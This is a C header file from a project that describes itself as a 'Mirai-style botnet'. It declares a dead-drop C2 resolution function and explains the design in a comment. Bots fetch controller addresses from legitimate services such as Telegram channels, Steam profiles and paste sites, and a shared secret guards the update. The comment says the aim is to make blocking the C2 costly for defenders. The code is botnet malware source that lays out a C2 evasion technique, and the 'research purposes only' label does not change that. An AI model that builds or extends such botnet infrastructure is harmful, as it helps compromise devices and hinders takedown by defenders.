/*
 * notnet - Modern Mirai-Style Botnet
 * deaddrop.h - Dead-drop C2 resolution (#86)
 *
 * Research purposes only.
 */
#ifndef NOTNET_DEADDROP_H
#define NOTNET_DEADDROP_H

#include "protocol.h"

/* Dead-drop C2 resolution (#86).
 *
 * At boot (and every bot->dead_drop_interval seconds) the bot fetches an
 * opaque C2-endpoint blob from a legitimate service (Telegram channel,
 * Steam community profile, pastebin-style HTTP) and, only when it verifies
 * against the shared c2_secret, applies it as an override for the C2
 * endpoints. The blob format is a flat key=value body, e.g.:
 *
 *     server=203.0.113.10&port=8443&secret=<c2_secret>
 *
 * The fetch itself is plaintext HTTP (the default build has no TLS), so the
 * transport is deliberately NOT a trust boundary. Trust comes exclusively
 * from the verification gate: a blob is applied only if its secret= field
 * echoes the configured c2_secret (proof of possession by the operator).
 * An empty secret, a malformed body, a fetch failure, or a secret mismatch
 * all fail closed — the static config remains the only source of C2
 * endpoints. This mirrors how modern infostealers resolve C2 through
 * legitimate chat/text infrastructure: blocking the dead-drop means blocking
 * a legitimate service, and a taken-over drop cannot move the bot without
 * the secret.
 *
 * Returns 0 when a verified blob was applied, -1 when disabled, the fetch
 * failed, the blob was malformed, or verification failed (static config
 * remains the fallback). */
int deaddrop_resolve(notnet_bot_t *bot);

#endif /* NOTNET_DEADDROP_H */
